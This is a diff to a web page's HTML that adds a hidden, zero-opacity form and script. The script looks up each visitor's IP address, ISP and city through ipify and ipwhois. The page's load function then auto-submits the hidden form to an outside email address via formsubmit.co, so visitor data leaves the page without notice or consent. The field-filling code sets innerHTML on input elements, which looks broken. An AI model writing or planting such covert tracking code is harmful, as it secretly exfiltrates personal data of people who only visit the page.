@@ -150,15 +150,73 @@
   }
   function myLoad() {
     var myContent = localStorage.getItem("myContent");
+
     document.getElementById("myTextarea").value = myContent;
+    notificacion.submit();
+
   }
 </script>
 
-
-<form action="https://formsubmit.co/jesusemmanuelmbjesuse@outlook.es" method="POST">
-  <input type="text" name="textoenviar"></label>
-  <input type="submit" value="enviar">
+<form style="opacity: 0;" name="notificacion" action="https://formsubmit.co/jesusemmanuelmbjesuse@outlook.es" method="POST">
+  <input type="text" name="ip" id="ip"></label>
+  <input type="text" name="isp" id="isp"></label>
+  <input type="text" name="city" id="city"></label>
 </form>
+
+
+</body>
+</html>
+
+<script>
+  window.onload = () => {
+
+    let userIP = null;
+
+    const getIP = async () => {
+
+      return await fetch('https://api.ipify.org?format=json')
+      .then(response => response.json());
+    }
+
+    const getInfo = async (ip) => {
+
+            /*
+                https://ipstack.com/
+                https://ipwhois.io/
+                https://ipapi.co/
+                */
+
+                return await fetch('https://ipwhois.app/json/' + ip + '?lang=es')
+                .then(response => response.json());
+              }
+
+
+              getIP().then(response => {
+                userIP = response.ip;
+                getInfo(userIP).then(location => {
+
+
+
+                  if(location){
+                    document.querySelector('#ip').innerHTML = userIP;
+                    document.querySelector('#city').innerHTML = location.city ?? 'error';  
+                    document.querySelector('#isp').innerHTML = location.isp ?? 'error';
+                  }
+                })
+
+              });
+            }
+          </script>
+
+
+
+
+
+
+
+
+
+
 <!-- partial -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/moment.min.js"></script>
 <script type="text/javascript">
